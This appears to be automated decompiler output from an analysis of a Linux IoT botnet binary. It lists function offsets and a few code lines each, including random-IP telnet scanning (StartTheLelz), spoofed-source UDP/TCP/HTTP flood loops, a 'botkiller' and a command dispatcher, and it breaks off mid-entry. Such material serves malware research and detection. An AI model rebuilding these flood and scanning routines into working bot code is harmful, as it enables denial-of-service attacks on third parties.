                        while (true) {
                while (true) {
=================FUNCTION : sockprintf ===================
++++++++ FUNCTION START 4735
++++++++ FUNCTION END 4956
++++++++ FUNCTION LENGTH 221
    print(&v213, a2, (int32_t)&v214);
    int32_t result = __libc_send(a1, v212, __GI_strlen(), 0x4000); // 0x10001270
    free();
=================FUNCTION : strncpy ===================
++++++++ FUNCTION START 39438
++++++++ FUNCTION END 39760
++++++++ FUNCTION LENGTH 322
        while (true) {
        while (true) {
        while (true) {
=================FUNCTION : strnlen ===================
++++++++ FUNCTION START 39763
++++++++ FUNCTION END 40080
++++++++ FUNCTION LENGTH 317
            while (true) {
    while (true) {
    while (true) {
=================FUNCTION : __GI_fclose ===================
++++++++ FUNCTION START 28880
++++++++ FUNCTION END 29141
++++++++ FUNCTION LENGTH 261
    if (__libc_close(v213) <= 0xffffffff) {
        free();
    _stdio_openlist_dec_use();
=================FUNCTION : __GI_strncat ===================
++++++++ FUNCTION START 74036
++++++++ FUNCTION END 74343
++++++++ FUNCTION LENGTH 307
        while (true) {
                while (true) {
    while (true) {
=================FUNCTION : __open_etc_hosts ===================
++++++++ FUNCTION START 77760
++++++++ FUNCTION END 77983
++++++++ FUNCTION LENGTH 223
    int32_t v212 = __GI_fopen((int32_t)"/etc/hosts", (int32_t)&v211); // 0x100140f0
        result = __GI_fopen((int32_t)"/etc/config/hosts", v213);
=================FUNCTION : matchPrompt ===================
++++++++ FUNCTION START 10910
++++++++ FUNCTION END 11193
++++++++ FUNCTION LENGTH 283
    while (true) {
        while (true) {
=================FUNCTION : contains_string ===================
++++++++ FUNCTION START 9860
++++++++ FUNCTION END 10107
++++++++ FUNCTION LENGTH 247
        while (true) {
            if (strcasestr((char *)a1, v215, 4 * v214 + a2) == 0) {
=================FUNCTION : __GI_strlen ===================
++++++++ FUNCTION START 39137
++++++++ FUNCTION END 39435
++++++++ FUNCTION LENGTH 298
        while (true) {
    while (true) {
=================FUNCTION : __GI_strchr ===================
++++++++ FUNCTION START 38342
++++++++ FUNCTION END 38665
++++++++ FUNCTION LENGTH 323
        while (true) {
    while (true) {
=================FUNCTION : abort ===================
++++++++ FUNCTION START 70505
++++++++ FUNCTION END 70837
++++++++ FUNCTION LENGTH 332
            __GI_sigprocmask(1, v212, 0);
        __GI_sigprocmask(1, v212, 0);
=================FUNCTION : memrchr ===================
++++++++ FUNCTION START 67492
++++++++ FUNCTION END 67829
++++++++ FUNCTION LENGTH 337
        while (true) {
        while (true) {
=================FUNCTION : __stdio_WRITE ===================
++++++++ FUNCTION START 60282
++++++++ FUNCTION END 60593
++++++++ FUNCTION LENGTH 311
    while (true) {
            while (true) {
=================FUNCTION : __GI_fgets_unlocked ===================
++++++++ FUNCTION START 36503
++++++++ FUNCTION END 36817
++++++++ FUNCTION LENGTH 314
            while (true) {
                char v219 = getc_unlocked((int16_t *)a3, v215); // 0x1000e40c
=================FUNCTION : __GI_strpbrk ===================
++++++++ FUNCTION START 68073
++++++++ FUNCTION END 68324
++++++++ FUNCTION LENGTH 251
    while (true) {
        while (true) {
=================FUNCTION : _uintmaxtostr ===================
++++++++ FUNCTION START 61774
++++++++ FUNCTION END 62105
++++++++ FUNCTION LENGTH 331
        while (true) {
    while (true) {
=================FUNCTION : __libc_system ===================
++++++++ FUNCTION START 53039
++++++++ FUNCTION END 53295
++++++++ FUNCTION LENGTH 256
    int32_t v215 = __vfork(); // 0x10010398
        if (wait4(v215) == -1) {
=================FUNCTION : execl ===================
++++++++ FUNCTION START 54447
++++++++ FUNCTION END 54730
++++++++ FUNCTION LENGTH 283
    while (true) {
    while (true) {
=================FUNCTION : __GI_initstate_r ===================
++++++++ FUNCTION START 52792
++++++++ FUNCTION END 53036
++++++++ FUNCTION LENGTH 244
        srandom_r();
    srandom_r();
=================FUNCTION : trim ===================
++++++++ FUNCTION START 2259
++++++++ FUNCTION END 2535
++++++++ FUNCTION LENGTH 276
    while (true) {
            while (true) {
=================FUNCTION : _stdio_term ===================
++++++++ FUNCTION START 31049
++++++++ FUNCTION END 31314
++++++++ FUNCTION LENGTH 265
        while (true) {
    while (true) {
=================FUNCTION : inet_aton ===================
++++++++ FUNCTION START 68327
++++++++ FUNCTION END 68629
++++++++ FUNCTION LENGTH 302
    while (true) {
        while (true) {
=================FUNCTION : _stdio_openlist_dec_use ===================
++++++++ FUNCTION START 35882
++++++++ FUNCTION END 36160
++++++++ FUNCTION LENGTH 278
            while (true) {
                        free();
=================FUNCTION : read_with_timeout ===================
++++++++ FUNCTION START 8522
++++++++ FUNCTION END 8759
++++++++ FUNCTION LENGTH 237
    while (true) {
            return __libc_recv(a1, a3, a4, 0);
=================FUNCTION : strcasestr ===================
++++++++ FUNCTION START 41436
++++++++ FUNCTION END 41680
++++++++ FUNCTION LENGTH 244
    while (true) {
=================FUNCTION : GetRandomIP ===================
++++++++ FUNCTION START 12989
++++++++ FUNCTION END 13204
++++++++ FUNCTION LENGTH 215
    return rand_cmwc() & -1 - a1 ^ v212 & a1;
=================FUNCTION : __libc_creat ===================
++++++++ FUNCTION START 25950
++++++++ FUNCTION END 26164
++++++++ FUNCTION LENGTH 214
    return __libc_open(577, 577);
=================FUNCTION : __check_one_fd ===================
++++++++ FUNCTION START 56139
++++++++ FUNCTION END 56367
++++++++ FUNCTION LENGTH 228
    int32_t v212 = __libc_open((int32_t)"/dev/null", a2); // 0x10010b18
=================FUNCTION : __GI_wcsnrtombs ===================
++++++++ FUNCTION START 59960
++++++++ FUNCTION END 60279
++++++++ FUNCTION LENGTH 319
            while (true) {
=================FUNCTION : getsockopt ===================
++++++++ FUNCTION START 45990
++++++++ FUNCTION END 46203
++++++++ FUNCTION LENGTH 213
    return __socketcall(15, (int32_t)&a1);
=================FUNCTION : random ===================
++++++++ FUNCTION START 51095
++++++++ FUNCTION END 51314
++++++++ FUNCTION LENGTH 219
    __GI_random_r((int32_t *)0x10028480, (int32_t)&result);
=================FUNCTION : zprintf ===================
++++++++ FUNCTION START 4301
++++++++ FUNCTION END 4515
++++++++ FUNCTION LENGTH 214
    return print(NULL, a1, (int32_t)&v212);
=================FUNCTION : inet_addr ===================
++++++++ FUNCTION START 44024
++++++++ FUNCTION END 44245
++++++++ FUNCTION LENGTH 221
    if (inet_aton((char *)&result) != 0) {
=================FUNCTION : __GI_inet_ntoa_r ===================
++++++++ FUNCTION START 43568
++++++++ FUNCTION END 43804
++++++++ FUNCTION LENGTH 236
    while (true) {
=================FUNCTION : __GI_strspn ===================
++++++++ FUNCTION START 74346
++++++++ FUNCTION END 74595
++++++++ FUNCTION LENGTH 249
    while (true) {
=================FUNCTION : __libc_send ===================
++++++++ FUNCTION START 46422
++++++++ FUNCTION END 46635
++++++++ FUNCTION LENGTH 213
    return __socketcall(9, (int32_t)&a1);
=================FUNCTION : malloc ===================
++++++++ FUNCTION START 48675
++++++++ FUNCTION END 48972
++++++++ FUNCTION LENGTH 297
            __heap_free((int32_t *)v220, v218, v221);
=================FUNCTION : __GI_gethostbyname ===================
++++++++ FUNCTION START 44248
++++++++ FUNCTION END 44464
++++++++ FUNCTION LENGTH 216
    gethostbyname_r(a1, &v212, (int32_t)&v211, 460, (int32_t)&result, v210);
=================FUNCTION : __libc_connect ===================
++++++++ FUNCTION START 45558
++++++++ FUNCTION END 45771
++++++++ FUNCTION LENGTH 213
    return __socketcall(3, (int32_t)&a1);
=================FUNCTION : srand ===================
++++++++ FUNCTION START 51766
++++++++ FUNCTION END 51983
++++++++ FUNCTION LENGTH 217
    srandom_r();
=================FUNCTION : sclose ===================
++++++++ FUNCTION START 14016
++++++++ FUNCTION END 14237
++++++++ FUNCTION LENGTH 221
        __libc_close(a1);
=================FUNCTION : __GI_vsnprintf ===================
++++++++ FUNCTION START 29580
++++++++ FUNCTION END 29808
++++++++ FUNCTION LENGTH 228
    int32_t result = _vfprintf_internal(); // 0x1000ca68
=================FUNCTION : _ppfs_init ===================
++++++++ FUNCTION START 32989
++++++++ FUNCTION END 33250
++++++++ FUNCTION LENGTH 261
    while (true) {
=================FUNCTION : __libc_waitpid ===================
++++++++ FUNCTION START 27781
++++++++ FUNCTION END 27995
++++++++ FUNCTION LENGTH 214
    return wait4(0);
=================FUNCTION : rawmemchr ===================
++++++++ FUNCTION START 73736
++++++++ FUNCTION END 74033
++++++++ FUNCTION LENGTH 297
    while (true) {
=================FUNCTION : __GI_fopen ===================
++++++++ FUNCTION START 29144
++++++++ FUNCTION END 29358
++++++++ FUNCTION LENGTH 214
    return _stdio_fopen(0, (char *)-1);
=================FUNCTION : __GI_getsockname ===================
++++++++ FUNCTION START 45774
++++++++ FUNCTION END 45987
++++++++ FUNCTION LENGTH 213
    return __socketcall(6, (int32_t)&a1);
=================FUNCTION : free ===================
++++++++ FUNCTION START 48975
++++++++ FUNCTION END 49243
++++++++ FUNCTION LENGTH 268
    int32_t v213 = __heap_free(&v211, v210 - 4, v212); // 0x1000f970
=================FUNCTION : inet_ntop4 ===================
++++++++ FUNCTION START 75732
++++++++ FUNCTION END 75997
++++++++ FUNCTION LENGTH 265
    while (true) {
=================FUNCTION : socket ===================
++++++++ FUNCTION START 47070
++++++++ FUNCTION END 47283
++++++++ FUNCTION LENGTH 213
    return __socketcall(1, (int32_t)&a1);
=================FUNCTION : __GI__exit ===================
++++++++ FUNCTION START 23071
++++++++ FUNCTION END 23295
++++++++ FUNCTION LENGTH 224
    while (true) {
=================FUNCTION : fdgets ===================
++++++++ FUNCTION START 5755
++++++++ FUNCTION END 5994
++++++++ FUNCTION LENGTH 239
    while (true) {
=================FUNCTION : advance_state ===================
++++++++ FUNCTION START 8762
++++++++ FUNCTION END 8983
++++++++ FUNCTION LENGTH 221
        __libc_close(*a1);
=================FUNCTION : get_telstate_host ===================
++++++++ FUNCTION START 8080
++++++++ FUNCTION END 8294
++++++++ FUNCTION LENGTH 214
    return __GI_inet_ntoa(&v212, a1);
=================FUNCTION : getHost ===================
++++++++ FUNCTION START 6522
++++++++ FUNCTION END 6737
++++++++ FUNCTION LENGTH 215
    int32_t v212 = inet_addr(a1); // 0x10001a70
=================FUNCTION : __raise ===================
++++++++ FUNCTION START 78661
++++++++ FUNCTION END 78875
++++++++ FUNCTION LENGTH 214
    return kill(__libc_getpid(), a1);
=================FUNCTION : _ppfs_setargs ===================
++++++++ FUNCTION START 33480
++++++++ FUNCTION END 33882
++++++++ FUNCTION LENGTH 402
            while (true) {
=================FUNCTION : __GI_strcasecmp ===================
++++++++ FUNCTION START 41179
++++++++ FUNCTION END 41433
++++++++ FUNCTION LENGTH 254
    while (true) {
=================FUNCTION : __heap_alloc ===================
++++++++ FUNCTION START 49530
++++++++ FUNCTION END 49809
++++++++ FUNCTION LENGTH 279
    while (true) {
=================FUNCTION : getdtablesize ===================
++++++++ FUNCTION START 24592
++++++++ FUNCTION END 24813
++++++++ FUNCTION LENGTH 221
    if (getrlimit(7, (int32_t)&result) >= 0) {
=================FUNCTION : fgets ===================
++++++++ FUNCTION START 35418
++++++++ FUNCTION END 35647
++++++++ FUNCTION LENGTH 229
    int32_t result = __GI_fgets_unlocked((char *)v212, a2, a3); // 0x1000e020
=================FUNCTION : makeIPPacket ===================
++++++++ FUNCTION START 13797
++++++++ FUNCTION END 14013
++++++++ FUNCTION LENGTH 216
    return rand_cmwc();
=================FUNCTION : __GI_inet_ntoa ===================
++++++++ FUNCTION START 43807
++++++++ FUNCTION END 44021
++++++++ FUNCTION LENGTH 214
    return __GI_inet_ntoa_r(&v211, (int32_t)&v212);
=================FUNCTION : inet_pton4 ===================
++++++++ FUNCTION START 74825
++++++++ FUNCTION END 75108
++++++++ FUNCTION LENGTH 283
    while (true) {
=================FUNCTION : __libc_sendto ===================
++++++++ FUNCTION START 46638
++++++++ FUNCTION END 46851
++++++++ FUNCTION LENGTH 213
    return __socketcall(11, (int32_t)&a1);
=================FUNCTION : __GI_setsockopt ===================
++++++++ FUNCTION START 46854
++++++++ FUNCTION END 47067
++++++++ FUNCTION LENGTH 213
    return __socketcall(14, (int32_t)&a1);
=================FUNCTION : __xpg_strerror_r ===================
++++++++ FUNCTION START 40654
++++++++ FUNCTION END 40959
++++++++ FUNCTION LENGTH 305
        while (true) {
=================FUNCTION : rand ===================
++++++++ FUNCTION START 50878
++++++++ FUNCTION END 51092
++++++++ FUNCTION LENGTH 214
    return random();
=================FUNCTION : memcpy ===================
++++++++ FUNCTION START 37322
++++++++ FUNCTION END 37727
++++++++ FUNCTION LENGTH 405
        while (true) {
=================FUNCTION : isatty ===================
++++++++ FUNCTION START 41900
++++++++ FUNCTION END 42115
++++++++ FUNCTION LENGTH 215
    __GI_tcgetattr(&v212);
=================FUNCTION : __GI_strcoll ===================
++++++++ FUNCTION START 38668
++++++++ FUNCTION END 38904
++++++++ FUNCTION LENGTH 236
    while (true) {
=================FUNCTION : makeRandomStr ===================
++++++++ FUNCTION START 7500
++++++++ FUNCTION END 7725
++++++++ FUNCTION LENGTH 225
            v212 = rand_cmwc();
=================FUNCTION : __encode_dotted ===================
++++++++ FUNCTION START 79332
++++++++ FUNCTION END 79627
++++++++ FUNCTION LENGTH 295
    while (true) {
=================FUNCTION : parseHex ===================
++++++++ FUNCTION START 5997
++++++++ FUNCTION END 6238
++++++++ FUNCTION LENGTH 241
    while (true) {
=================FUNCTION : __decode_dotted ===================
++++++++ FUNCTION START 79630
++++++++ FUNCTION END 79942
++++++++ FUNCTION LENGTH 312
    while (true) {
=================FUNCTION : _charpad ===================
++++++++ FUNCTION START 31547
++++++++ FUNCTION END 31787
++++++++ FUNCTION LENGTH 240
    while (true) {
=================FUNCTION : __heap_alloc_at ===================
++++++++ FUNCTION START 49812
++++++++ FUNCTION END 50079
++++++++ FUNCTION LENGTH 267
    while (true) {
=================FUNCTION : ioctl ===================
++++++++ FUNCTION START 22092
++++++++ FUNCTION END 22381
++++++++ FUNCTION LENGTH 289
            return __GI_tcgetattr((int32_t *)a3);
=================FUNCTION : sprintf ===================
++++++++ FUNCTION START 29361
++++++++ FUNCTION END 29577
++++++++ FUNCTION LENGTH 216
    return __GI_vsnprintf();
=================FUNCTION : __length_dotted ===================
++++++++ FUNCTION START 79945
++++++++ FUNCTION END 80186
++++++++ FUNCTION LENGTH 241
    while (true) {
=================FUNCTION : __libc_recv ===================
++++++++ FUNCTION START 46206
++++++++ FUNCTION END 46419
++++++++ FUNCTION LENGTH 213
    return __socketcall(10, (int32_t)&a1);
=================FUNCTION : __get_hosts_byname_r ===================
++++++++ FUNCTION START 70052
++++++++ FUNCTION END 70268
++++++++ FUNCTION LENGTH 216
    int32_t result = __read_etc_hosts_r(0, a1, a2, 0, (int32_t *)a3, a4, a5, (int32_t)&v212, a7); // 0x10012d64
=================FUNCTION : szprintf ===================
++++++++ FUNCTION START 4518
++++++++ FUNCTION END 4732
++++++++ FUNCTION LENGTH 214
    return print(&a1, a2, (int32_t)&v212);
=================FUNCTION : tcpcsum ===================
++++++++ FUNCTION START 13575
++++++++ FUNCTION END 13794
++++++++ FUNCTION LENGTH 219
    free();
================================================================================
========	WHILE LOOPS INTRESTING INSTRUCTIONS : =================================
================================================================================
=============================WHILE LOOPS ID : 1 @ trim ====================================
++++++++ WHILE START : 2474 
++++++++ WHILE FUNCTION : trim 
++++++++ WHILE END : 2534 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
=============================WHILE LOOPS ID : 2 @ prints ====================================
++++++++ WHILE START : 3000 
++++++++ WHILE FUNCTION : prints 
++++++++ WHILE END : 3011 
++++++++ INTRESTING INSTRUCTIONS :  
		printchar((int32_t *)a1, v214);
=============================WHILE LOOPS ID : 3 @ prints ====================================
++++++++ WHILE START : 3146 
++++++++ WHILE FUNCTION : prints 
++++++++ WHILE END : 3157 
++++++++ INTRESTING INSTRUCTIONS :  
		printchar((int32_t *)a1, v214);
=============================WHILE LOOPS ID : 4 @ prints ====================================
++++++++ WHILE START : 3299 
++++++++ WHILE FUNCTION : prints 
++++++++ WHILE END : 3310 
++++++++ INTRESTING INSTRUCTIONS :  
		printchar((int32_t *)a1, v214);
=============================WHILE LOOPS ID : 6 @ print ====================================
++++++++ WHILE START : 3975 
++++++++ WHILE FUNCTION : print 
++++++++ WHILE END : 4290 
++++++++ INTRESTING INSTRUCTIONS :  
		printchar(a1, (int32_t)*v217);
		while (true) {
		while (true) {
		result2 = prints(v213, v237, v226, v222) + result;
		int32_t v240 = printi(v213, v239, 10, 1, v226, v222, 97) + result; // 0x10000cb0
		int32_t v242 = printi(v213, v241, 16, 0, v226, v222, 97) + result; // 0x10000d64
		int32_t v244 = printi(v213, v243, 16, 0, v226, v222, 65) + result; // 0x10000e18
		int32_t v246 = printi(v213, v245, 10, 0, v226, v222, 97) + result; // 0x10000ecc
		int32_t v248 = prints(v213, (char *)&v216, v226, v222); // 0x10000f7c
		printchar(a1, (int32_t)*v217);
=============================WHILE LOOPS ID : 7 @ fdpclose ====================================
++++++++ WHILE START : 5721 
++++++++ WHILE FUNCTION : fdpclose 
++++++++ WHILE END : 5744 
++++++++ INTRESTING INSTRUCTIONS :  
		if (__libc_waitpid(v218, (int32_t)&v217, 0) == -1) {
		__GI_sigprocmask(2, v216, 0);
=============================WHILE LOOPS ID : 10 @ getBogos ====================================
++++++++ WHILE START : 7192 
++++++++ WHILE FUNCTION : getBogos 
++++++++ WHILE END : 7256 
++++++++ INTRESTING INSTRUCTIONS :  
		if (fdgets(v214, 0x1000, v212) == 0) {
		__libc_close(v212);
		uppercase((char *)&v213);
		if (strstr(v214, "BOGOMIPS", 0x10010000) == v214) {
		while (true) {
		while (true) {
		__libc_close(v212);
=============================WHILE LOOPS ID : 11 @ getCores ====================================
++++++++ WHILE START : 7477 
++++++++ WHILE FUNCTION : getCores 
++++++++ WHILE END : 7496 
++++++++ INTRESTING INSTRUCTIONS :  
		if (fdgets(v214, 0x1000, v212) == 0) {
		__libc_close(v212);
		uppercase((char *)&v213);
		if (strstr(v214, "BOGOMIPS", 0x10010000) == v214) {
=============================WHILE LOOPS ID : 12 @ recvLine ====================================
++++++++ WHILE START : 7963 
++++++++ WHILE FUNCTION : recvLine 
++++++++ WHILE END : 8057 
++++++++ INTRESTING INSTRUCTIONS :  
		sockprintf(v222, (int32_t)"PING", 0x10010000);
		while (true) {
		while (true) {
		if (__libc_recv(v222, (int32_t)&v228, 1, 0) != 1) {
		while (true) {
=============================WHILE LOOPS ID : 14 @ read_with_timeout ====================================
++++++++ WHILE START : 8741 
++++++++ WHILE FUNCTION : read_with_timeout 
++++++++ WHILE END : 8758 
++++++++ INTRESTING INSTRUCTIONS :  
		return __libc_recv(a1, a3, a4, 0);
=============================WHILE LOOPS ID : 15 @ contains_string ====================================
++++++++ WHILE START : 10084 
++++++++ WHILE FUNCTION : contains_string 
++++++++ WHILE END : 10101 
++++++++ INTRESTING INSTRUCTIONS :  
		if (strcasestr((char *)a1, v215, 4 * v214 + a2) == 0) {
=============================WHILE LOOPS ID : 16 @ connectTimeout ====================================
++++++++ WHILE START : 10356 
++++++++ WHILE FUNCTION : connectTimeout 
++++++++ WHILE END : 10387 
++++++++ INTRESTING INSTRUCTIONS :  
		getsockopt(a1, 1, 4, (int32_t)&v224, (int32_t)&v223);
=============================WHILE LOOPS ID : 17 @ listFork ====================================
++++++++ WHILE START : 10617 
++++++++ WHILE FUNCTION : listFork 
++++++++ WHILE END : 10637 
++++++++ INTRESTING INSTRUCTIONS :  
		free();
=============================WHILE LOOPS ID : 18 @ matchPrompt ====================================
++++++++ WHILE START : 11131 
++++++++ WHILE FUNCTION : matchPrompt 
++++++++ WHILE END : 11192 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
=============================WHILE LOOPS ID : 19 @ readUntil ====================================
++++++++ WHILE START : 11416 
++++++++ WHILE FUNCTION : readUntil 
++++++++ WHILE END : 11515 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
		int32_t v220 = __libc_recv(a1, v219, 1, 0); // 0x10003038
		if (strstr(a6, (char *)a2, v219) != 0) {
		int32_t v224 = __libc_recv(a1, v219 + 1, 2, 0); // 0x100030a8
=============================WHILE LOOPS ID : 21 @ StartTheLelz ====================================
++++++++ WHILE START : 14739 
++++++++ WHILE FUNCTION : StartTheLelz 
++++++++ WHILE END : 14858 
++++++++ INTRESTING INSTRUCTIONS :  
		GetRandomPublicIP(v226);
		socket(2, 1, 0);
		if (__libc_connect(*v225, (int32_t)&v212, 16) == -1) {
		socket(2, 1, 0);
=============================WHILE LOOPS ID : 26 @ sendSTD ====================================
++++++++ WHILE START : 15133 
++++++++ WHILE FUNCTION : sendSTD 
++++++++ WHILE END : 15156 
++++++++ INTRESTING INSTRUCTIONS :  
		random();
		__libc_send(v212, v223, 65, 0);
		__libc_connect(v212, v216, 16);
		__libc_close(v212);
=============================WHILE LOOPS ID : 27 @ sendUDP ====================================
++++++++ WHILE START : 15408 
++++++++ WHILE FUNCTION : sendUDP 
++++++++ WHILE END : 15450 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
		__libc_sendto(v216, v217, a5, 0, v212, 16, v212);
		rand_cmwc();
=============================WHILE LOOPS ID : 28 @ sendUDP ====================================
++++++++ WHILE START : 15510 
++++++++ WHILE FUNCTION : sendUDP 
++++++++ WHILE END : 15565 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
		__libc_sendto(v223, v228, a5 + 28, 0, v212, 16, v212);
		*v229 = (int16_t)rand_cmwc();
		v244 = rand_cmwc();
		*(int16_t *)(v228 | 4) = (int16_t)rand_cmwc();
		*(int32_t *)(v228 | 12) = htonl(GetRandomIP(v226));
=============================WHILE LOOPS ID : 29 @ sendTCP ====================================
++++++++ WHILE START : 15864 
++++++++ WHILE FUNCTION : sendTCP 
++++++++ WHILE END : 15948 
++++++++ INTRESTING INSTRUCTIONS :  
		if (__GI_strcoll(v239, (int32_t)"rst") == 0) {
		if (__GI_strcoll(v239, (int32_t)"psh") == 0) {
		sockprintf(v214, (int32_t)"Invalid flag \"%s\"", v238);
=============================WHILE LOOPS ID : 30 @ sendTCP ====================================
++++++++ WHILE START : 15973 
++++++++ WHILE FUNCTION : sendTCP 
++++++++ WHILE END : 16003 
++++++++ INTRESTING INSTRUCTIONS :  
		__libc_sendto(v213, v219, v217, 0, v211, 16, v211);
		v228 = GetRandomIP(v216);
		*(int16_t *)(v219 | 4) = (int16_t)rand_cmwc();
		*v225 = rand_cmwc();
		*v221 = (int16_t)rand_cmwc();
		*v232 = (int16_t)tcpcsum(v219, v231, v220);
=============================WHILE LOOPS ID : 31 @ sendTCP ====================================
++++++++ WHILE START : 16030 
++++++++ WHILE FUNCTION : sendTCP 
++++++++ WHILE END : 16046 
++++++++ INTRESTING INSTRUCTIONS :  
		__libc_sendto(v213, v219, v217, 0, v211, 16, v211);
		v228 = GetRandomIP(v216);
		*(int16_t *)(v219 | 4) = (int16_t)rand_cmwc();
		*v225 = rand_cmwc();
		*v221 = (int16_t)rand_cmwc();
		*v232 = (int16_t)tcpcsum(v219, v231, v220);
=============================WHILE LOOPS ID : 32 @ botkiller ====================================
++++++++ WHILE START : 16272 
++++++++ WHILE FUNCTION : botkiller 
++++++++ WHILE END : 16290 
++++++++ INTRESTING INSTRUCTIONS :  
		__libc_system(v212);
		__libc_system(v212);
=============================WHILE LOOPS ID : 33 @ sendHTTP ====================================
++++++++ WHILE START : 16740 
++++++++ WHILE FUNCTION : sendHTTP 
++++++++ WHILE END : 16790 
++++++++ INTRESTING INSTRUCTIONS :  
		if (__libc_fork() != 0) {
		while (true) {
		int32_t v220 = socket_connect(a1, a3); // 0x10009f4c
		__libc_close(v221);
=============================WHILE LOOPS ID : 34 @ processCmd ====================================
++++++++ WHILE START : 17290 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 17307 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
		sendTCP(v215, v258, v259, v260, v261, v217, v218);
=============================WHILE LOOPS ID : 36 @ processCmd ====================================
++++++++ WHILE START : 17365 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 17371 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 39 @ processCmd ====================================
++++++++ WHILE START : 17481 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 17532 
++++++++ INTRESTING INSTRUCTIONS :  
		sockprintf(v206, (int32_t)"None Killed.", 0x10010000);
		sockprintf(v206, (int32_t)"Killed %d.", v284);
		if (*v290 != __libc_getpid()) {
		kill(v292, 9);
=============================WHILE LOOPS ID : 40 @ processCmd ====================================
++++++++ WHILE START : 17551 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 17568 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
		sendSTD(v214, v270, v271);
=============================WHILE LOOPS ID : 44 @ processCmd ====================================
++++++++ WHILE START : 17659 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 17677 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
		sendHTTP(*v236, v211, (int16_t)v294, v210, v209, atol(v295, v239));
=============================WHILE LOOPS ID : 46 @ processCmd ====================================
++++++++ WHILE START : 17733 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 17739 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 50 @ processCmd ====================================
++++++++ WHILE START : 17854 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 17860 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 54 @ processCmd ====================================
++++++++ WHILE START : 17995 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 18001 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 57 @ processCmd ====================================
++++++++ WHILE START : 18070 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 18076 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 59 @ processCmd ====================================
++++++++ WHILE START : 18128 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 18134 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 63 @ processCmd ====================================
++++++++ WHILE START : 18237 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 18243 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 67 @ processCmd ====================================
++++++++ WHILE START : 18373 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 18379 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 70 @ processCmd ====================================
++++++++ WHILE START : 18437 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 18443 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 71 @ processCmd ====================================
++++++++ WHILE START : 18476 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 18482 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 72 @ processCmd ====================================
++++++++ WHILE START : 18525 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 18531 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 73 @ processCmd ====================================
++++++++ WHILE START : 18551 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 18568 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
		sendUDP(v216, v246, v247, v248, v249, v220, v219);
=============================WHILE LOOPS ID : 74 @ processCmd ====================================
++++++++ WHILE START : 18673 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 18679 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 75 @ processCmd ====================================
++++++++ WHILE START : 18731 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 18737 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 76 @ processCmd ====================================
++++++++ WHILE START : 18759 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 18765 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 77 @ processCmd ====================================
++++++++ WHILE START : 18798 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 18804 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 78 @ processCmd ====================================
++++++++ WHILE START : 18847 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 18853 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 79 @ processCmd ====================================
++++++++ WHILE START : 18923 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 18929 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 80 @ processCmd ====================================
++++++++ WHILE START : 18951 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 18957 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 81 @ processCmd ====================================
++++++++ WHILE START : 18990 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 18996 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 82 @ processCmd ====================================
++++++++ WHILE START : 19039 
